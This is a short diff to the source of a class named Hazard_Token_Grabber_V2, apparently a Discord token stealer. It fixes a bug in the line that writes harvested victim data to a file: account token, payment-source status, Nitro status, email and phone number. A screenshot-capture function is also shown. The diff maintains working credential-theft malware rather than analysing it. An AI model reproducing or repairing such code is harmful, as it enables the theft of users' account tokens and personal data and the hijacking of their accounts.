@@ -238,7 +238,7 @@ class Hazard_Token_Grabber_V2:
 
                 billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
                 
-                f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing.content}\nNitro: {has_nitro}\nNitro Expires in: {days_left} day(s)\nEmail: {email}\nPhone: {phone}\n[Avatar]({url})\n\n")
+                f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nNitro Expires in: {days_left} day(s)\nEmail: {email}\nPhone: {phone}\n[Avatar]({url})\n\n")
 
     def screenshot(self):
         image = pyautogui.screenshot()
